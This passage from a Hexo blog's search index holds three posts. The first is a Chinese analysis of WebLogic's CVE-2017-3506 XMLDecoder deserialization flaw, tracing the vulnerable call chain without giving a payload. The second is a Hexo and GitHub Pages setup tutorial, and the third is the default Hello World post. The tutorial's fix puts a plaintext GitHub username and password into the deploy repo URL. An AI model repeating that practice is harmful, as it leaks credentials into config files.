这样，通过漏洞复现，我们得到了weblogic的处理流程如下（为了方便查看，调用栈顺序为从上到下） weblogic.wsee.jaxws.workcontext.WorkContextServerTube-&gt;processRequest weblogic.wsee.jaxws.workcontext.WorkContextTube-&gt;readHeaderOld weblogic.wsee.jaxws.workcontext.WorkContextServerTube-&gt;receive weblogic.workarea.WorkContextMapImpl-&gt;receiveRequest weblogic.workarea.WorkContextLocalMap-&gt;receiveRequest weblogic.workarea.spi.WorkContextEntryImpl-&gt;readEntry weblogic.wsee.workarea.WorkContextXmlInputAdapter-&gt;readUTF 至此，漏洞复现已经完成，并根据漏洞复现中得到的信息，为动态调试打下了基础。 动态调试从poc中可以看出，这个漏洞是wls-wsat这个接口出了问题，搜索一下文件，发现了wls-wsat.war这个包，打开后点击web.xml查看有哪些接口 进来后发现第一个接口就是我们想要的接口，调用栈和WebLogic servlet的分发机制比较复杂，我也不是很懂emm，只是跟着复现过程发现的函数调用栈跟了一遍流程。 具体流程如下 weblogic.wsee.jaxws.workcontext.WorkContextServerTube123456789101112131415161718public NextAction processRequest(Packet var1) &#123; this.isUseOldFormat = false; if (var1.getMessage() != null) &#123; HeaderList var2 = var1.getMessage().getHeaders(); Header var3 = var2.get(WorkAreaConstants.WORK_AREA_HEADER, true); if (var3 != null) &#123; this.readHeaderOld(var3); this.isUseOldFormat = true; &#125; Header var4 = var2.get(this.JAX_WS_WORK_AREA_HEADER, true); if (var4 != null) &#123; this.readHeader(var4); &#125; &#125; return super.processRequest(var1); &#125; var1为POST传进来的XML数据，var3是xml的头部解析，如果存在（头不为空），就进入readHeaderOld()方法，跟进readHeaderOld() weblogic.wsee.jaxws.workcontext.WorkContextTube123456789101112131415161718protected void readHeaderOld(Header var1) &#123; try &#123; XMLStreamReader var2 = var1.readHeader(); var2.nextTag(); var2.nextTag(); XMLStreamReaderToXMLStreamWriter var3 = new XMLStreamReaderToXMLStreamWriter(); ByteArrayOutputStream var4 = new ByteArrayOutputStream(); XMLStreamWriter var5 = XMLStreamWriterFactory.create(var4); var3.bridge(var2, var5); var5.close(); WorkContextXmlInputAdapter var6 = new WorkContextXmlInputAdapter(new ByteArrayInputStream(var4.toByteArray())); this.receive(var6); &#125; catch (XMLStreamException var7) &#123; throw new WebServiceException(var7); &#125; catch (IOException var8) &#123; throw new WebServiceException(var8); &#125;&#125; 第一步processRequest中我们只把头读了进来，其他的数据还在缓冲区中，使用ByteArrayOutputStream函数读取剩余数据到var4。经过一系列的处理后，如果没有问题就创建WorkContextXmlInputAdapter对象 var6，之后跟进receive() weblogic.wsee.jaxws.workcontext.WorkContextServerTube1234protected void receive(WorkContextInput var1) throws IOException &#123; WorkContextMapInterceptor var2 = WorkContextHelper.getWorkContextHelper().getInterceptor(); var2.receiveRequest(var1);&#125; 继续跟进receiveRequest() weblogic.workarea.WorkContextMapImpl123public void receiveRequest(WorkContextInput var1) throws IOException &#123; ((WorkContextMapInterceptor)this.getMap()).receiveRequest(var1);&#125; 将var1传到了receiveRequest()方法中，继续跟进 weblogic.workarea.WorkContextLocalMap1234567891011121314151617181920public void receiveRequest(WorkContextInput var1) throws IOException &#123; while(true) &#123; try &#123; WorkContextEntry var2 = WorkContextEntryImpl.readEntry(var1); if (var2 == WorkContextEntry.NULL_CONTEXT) &#123; return; &#125; String var3 = var2.getName(); this.map.put(var3, var2); if (debugWorkContext.isDebugEnabled()) &#123; debugWorkContext.debug(&quot;receiveRequest(&quot; + var2.toString() + &quot;)&quot;); &#125; &#125; catch (ClassNotFoundException var4) &#123; if (debugWorkContext.isDebugEnabled()) &#123; debugWorkContext.debug(&quot;receiveRequest : &quot;, var4); &#125; &#125; &#125;&#125; WorkContextEntryImpl.readEntry(var1);对传进来的数据进行处理，具体的代码好像看不太懂，但是跟进！readEntry()！ weblogic.workarea.spi.WorkContextEntryImpl1234public static WorkContextEntry readEntry(WorkContextInput var0) throws IOException, ClassNotFoundException &#123; String var1 = var0.readUTF(); return (WorkContextEntry)(var1.length() == 0 ? NULL_CONTEXT : new WorkContextEntryImpl(var1, var0));&#125; 在这里对var0执行了readUTF()方法，终于看到曙光了，最后一个方法，跟进 weblogic.wsee.workarea.WorkContextXmlInputAdapter123public String readUTF() throws IOException &#123; return (String)this.xmlDecoder.readObject();&#125; 终于执行了readObject()方法，对XMLDecoder对象进行了反序列化，导致远程命令执行。 不用再跟进了，至此远程动态调试完成。 漏洞总结WebLogic没有对XML的数据进行任何的过滤，导致可以构造XML数据，反序列化任意对象，从而RCE，这也就是CVE-2017-3506产生的原因。 这是我第一次对一个漏洞进行完整的复现和调试，其间遇到了许多问题，磕磕绊绊的终于完成了这篇博客，感谢很多师傅的帮助和博客。经过这次尝试，我对java反序列化和漏洞调试有了初步的认识，希望继续努力，早日完成下一篇博客！ ReferenceWeblogic XMLDecoder RCE分析 WebLogic XMLDecoder反序列化漏洞（CVE-2017-10271)漏洞分析 从0开始学习WebLogic(Java)反序列化 (1)]]></content>
      <tags>
        <tag>weblogic反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hexo 从零搭建全过程]]></title>
    <url>%2F2018%2F10%2F25%2Fhexo%E4%BB%8E%E9%9B%B6%E6%90%AD%E5%BB%BA%E5%85%A8%E8%BF%87%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[hexo 搭建 blog 完整演示前言由于我自己的电脑其实搭建之前就有了各种环境，我也不记得啥时候安的了，稀里糊涂搭建好了，中间遇到了许多问题，这里我从头完整的整理一遍。 本篇博客包含的内容如下： 安装git 安装NodeJs 配置环境变量 安装hexo 部署项目并连接 使用hexo 我遇到的一些问题 1.安装 Git Bash我用的是windows环境 下载地址：Git for Windows 安装步骤：打开下载好的安装包，一路next，我不记得安装的时候是不是有添加到环境变量选项了，如果有记得选上，大概是 “add to path” 这样的选项，如果没选我后面会说到环境变量的意义和添加方法。后文每个软件安装都会涉及环境变量的问题，就不提了。 检测安装是否成功：在命令行输入 git version 返回git版本则安装成功 2.安装 NodeJsHexo 是基于NodeJs 的静态博客，而且安装 NodeJs 后自带的 npm 工具在后面下载 hexo 时会用到。 下载地址：Node.JS 安装步骤：一路next的过程中一样注意环境变量的问题，这样就不用后期自己配了 查看版本命令：node -v 3.配置环境变量什么是环境变量？百度百科给的解释是 环境变量（environment variables）一般是指在操作系统中用来指定操作系统运行环境的一些参数，如：临时文件夹位置和系统文件夹位置等。 我们要配置的是Windows中的PATH环境变量 (PATH 中罗列出 shell 输入的执行命令所在的目录) 我对PATH环境变量的理解是，当你在命令行输入一个命令时，系统会自动从C盘的system文件夹下寻找这个命令，如果没有找到，就会从你设置的PATH环境变量中的文件夹下寻找，所以设置环境变量可以让你更方便地在任何目录下使用你安装的软件命令。 那么如果安装时忘记添加PATH了，怎么手动配置呢？ 右击我的电脑 –&gt; 属性 –&gt; 高级系统设置 –&gt; 环境变量，然后对Path变量进行编辑，点击右侧的新建选项，这时左侧的变量列表会出现新的空栏，在空栏中输入你要配置的文件目录，应用后重启命令行即可生效。 4.安装 hexo 好了！该下的都下完了，该配的也配完了，这时可以直接使用npm工具安装hexo了。 安装命令：npm install -g hexo-cli 等待安装完成，如果安装完成后你找不到安装的位置，可以输入 npm config get prefix 命令得到默认安装路径，然后把这个路径添加到环境变量中 查看版本命令：hexo -v 初始化：新建一个空文件夹作为本地blog目录，命令行切换到该目录下执行 hexo init 进行初始化，初始化后文件夹内会生成一些初始化的文件，稍后会讲解其中要使用到的文件作用。 5.部署项目并连接接下来，在 Git hub 上创建项目并使本机能连接到 Git hub 上 创建一个repo，项目名称为 yourname.github.io (yourname 就是你的git hub用户名)，其他配置使用默认即可 回到本机git bash中配置git hub账户信息，依次输入如下几条命令： git config --global user.name &quot;yourname&quot; git config --global user.email &quot;youremail&quot; 创建SSH命令 ssh-keygen -t rsa -C &quot;youremail@example.com&quot; 该命令生成 ssh 密钥，会生成两个文件，一个是私钥，一个是公钥，我们要用到结尾是 .pub 的公钥 将得到的公钥文件用记事本打开，把内容复制下来，在git hub上settings中的SSH and GPG keys中新建一个SSH key，title栏随便取名，key栏把刚才复制的内容粘贴进去即可。 在 git bash 中验证是否成功 输入 ssh -T git@github.com 命令验证是否添加成功 成功连接你就可以进行下一步了 6.使用 hexo 在使用之前先用编辑器打开你blog项目文件夹下的_config.yml文件修改一些配置，添加下面这些配置，其中YourgithubName换成你自己的： 1234deploy: type: git repo: https://github.com/YourgithubName/YourgithubName.github.io.git branch: master 回到git bash中，进入你的blog目录，分别执行以下命令： 123hexo cleanhexo ghexo server 打开浏览器输入 localhost:4000 你就可以在本地看到你blog的样子了 接下来可以新建一篇博客并推到git hub上去 hexo new &quot;name&quot; 命令新建博客，输入该命令后会在你的blog文件下source/_posts目录下生成一个markdown文档，你可以在这个文档中添加博客内容 hexo g命令生成博客内容 hexo d命令将博客推上去 如果成功了，就可以在浏览器中输入 http://yourgithubname.github.io 看到你的个人博客了 7.我遇到的一些问题在搭建过程中我遇到了两个问题 我遇到的第一个问题是执行hexo g命令后生成的是空的，然后推也推不上去 我的解决方法是修改根目录下的 _config.yml 配置文件 修改deploy 节点 原来我们添加的配置为 1234deploy: type: git repo: https://github.com/YourgithubName/YourgithubName.github.io.git branch: master 修改为如下 1234deploy: type: git repo: https://yourname:yourpassword@github.com/YourgithubName/YourgithubName.github.io.git branch: master 且要注意每个配置选项的冒号后面要有一个空格，要严格参照规定格式 我遇到的第二个问题是SSH连接不上，原来在生成SSH密钥的时候，提示输入生成的文件名，我为了方便把它生成到D盘下新建的一个文件夹中，并且改了名字。但在进行SSH连接的时候，好像会默认到你的C盘 C:\Users\user\.ssh 目录下寻找 xx_rsa 密钥文件，所以我把两个密钥复制到了这个目录下并更改了文件名分别为：id_rsq 和 id_rsa.pub 就可以成功连接了。 如果你没遇到相同的问题就不用做以上修改，在配置的过程中可能会出现千奇百怪的问题，希望你第一次遇到问题时先去google搜索一下，可能相同的问题已经被解答过许多次了。]]></content>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hello World]]></title>
    <url>%2F2018%2F10%2F25%2Fhello-world%2F</url>
    <content type="text"><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new "My New Post" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment]]></content>
  </entry>
</search>
